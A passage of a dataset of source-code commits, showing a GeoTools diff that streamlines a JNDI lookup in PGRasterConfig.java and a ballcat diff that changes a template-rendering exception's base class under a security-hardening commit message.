            throw new FactoryException("A EPSG_DATA_SOURCE hint is required.");
        }
    }


--------------------
Filename: PGRasterConfig.java
Message: [GEOT-7115] Streamline JNDI lookups

Diff: @@ -117,7 +117,7 @@ static Document parse(File cfgfile) {
         String jndi = first(db, "jndi").map(this::nodeValue).orElse(null);
         if (jndi != null) {
             try {
-                dataSource = (DataSource) GeoTools.getInitialContext().lookup(jndi);
+                dataSource = (DataSource) GeoTools.jndiLookup(jndi);
             } catch (NamingException e) {
                 throw new IllegalArgumentException("Error performing JNDI lookup for: " + jndi, e);
             }

Code after:
        Element db =
                first(config.getDocumentElement(), "database")
                        .orElseThrow(
                                () ->
                                        new IllegalArgumentException(
                                                "Config has no database element"));

        DataSource dataSource = null;

        String jndi = first(db, "jndi").map(this::nodeValue).orElse(null);
        if (jndi != null) {
            try {
                dataSource = (DataSource) GeoTools.jndiLookup(jndi);
            } catch (NamingException e) {
                throw new IllegalArgumentException("Error performing JNDI lookup for: " + jndi, e);
            }
        }

        if (dataSource == null) {
            BasicDataSource source = new BasicDataSource();
            source.setDriverClassName("org.postgresql.Driver");

            String host = first(db, "host").map(this::nodeValue).orElse("localhost");

            Integer port =
                    first(db, "port").map(this::nodeValue).map(Integer::parseInt).orElse(5432);



--------------------
Filename: TemplateRenderException.java
Message: :lock: 修改模板引擎的默认安全策略，以防止RCE

Diff: @@ -5,7 +5,7 @@ package com.hccake.ballcat.codegen.exception;
  *
  * @author hccake
  */
-public class TemplateRenderException extends RuntimeException {
+public class TemplateRenderException extends Exception {
 
 	public TemplateRenderException(Exception e) {
 		super(e);

Code after:
package com.hccake.ballcat.codegen.exception;

/**
 * 模板渲染失败异常
 *
 * @author hccake
 */
public class TemplateRenderException extends Exception {

	public TemplateRenderException(Exception e) {
		super(e);
	}

}


--------------------
